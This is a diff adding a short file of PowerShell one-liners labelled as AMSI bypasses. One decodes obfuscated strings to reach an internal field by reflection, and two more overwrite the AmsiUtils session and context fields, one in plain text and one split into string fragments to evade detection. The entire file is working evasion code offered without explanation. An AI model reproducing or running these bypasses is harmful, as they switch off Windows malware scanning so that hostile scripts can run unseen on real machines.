@@ -1,0 +1,9 @@
+#AMSI_Bypass_Obfuscated
+$A="5492868772801748688168747280728187173688878280688776";$B="8281173680867656877679866880867644817687416876797271";function C($n, $m){[string]($n..$m|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " "};$k=C 0 37;$r=C 38 51;$a=[Ref].Assembly.GetType($k);$a.GetField($r,'NonPublic,Static').SetValue($null,$true)
+
+#Forcing an Error
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
+
+#Forcing an Error in obfuscation
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("Sy"+"st"+"em."+"Ma"+"na"+"gem"+"ent.A"+"uto"+"ma"+"t"+"ion."+"A"+"ms"+"iU"+"ti"+"l"+"s").GetField("am"+"si"+"Se"+"ssi"+"on","NonPubli"+"c,S"+"tatic").SetValue($null, $null);[Ref].Assembly.GetType("S"+"yst"+"em.Ma"+"na"+"gemen"+"t.A"+"ut"+"oma"+"ti"+"on.Am"+"siU"+"ti"+"ls").GetField("am"+"si"+"Con"+"te"+"xt","No"+"nPu"+"bl"+"ic,St"+"at"+"ic").SetValue($null, [IntPtr]$mem)
+
